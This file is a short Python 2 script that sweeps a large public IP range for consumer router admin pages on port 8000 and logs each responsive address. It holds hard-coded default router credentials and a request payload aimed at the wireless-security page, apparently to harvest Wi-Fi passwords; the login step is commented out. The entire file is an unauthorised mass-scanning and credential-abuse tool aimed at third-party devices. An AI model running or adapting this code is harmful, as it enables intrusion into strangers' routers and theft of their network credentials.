import requests as rq
from netaddr import *
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
global user, password

user = password = "usuario"
auth = HTTPBasicAuth(user, password)
rq = rq.Session()
ips = open("routers_observa.txt","wb")
headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
}

payload_passw = {
    "getpage":"html/index.html",
    "var:menu":"setup",
    "var:page":"wireless",
    "var:subpage":"wlsecurity" #wlbasic
}
login = {
    "SELECT_UserName":"support",
    "INPUT_Psd":"support"
}

for url in IPNetwork("190.252/14"):#179.32/15 /index.cgi  
    ip = "http://%s"%(url)+":8000/cgi-bin/webproc"
    try:
        r = rq.get(ip,timeout=0.3)
        if str(r.status_code)=="200":
            print ip+" OK"
            ips.write(str(url)+"\n")
            #r = rq.post(ip, payload=login, timeout=0.3)
            #print r.headers
    except:
        pass
    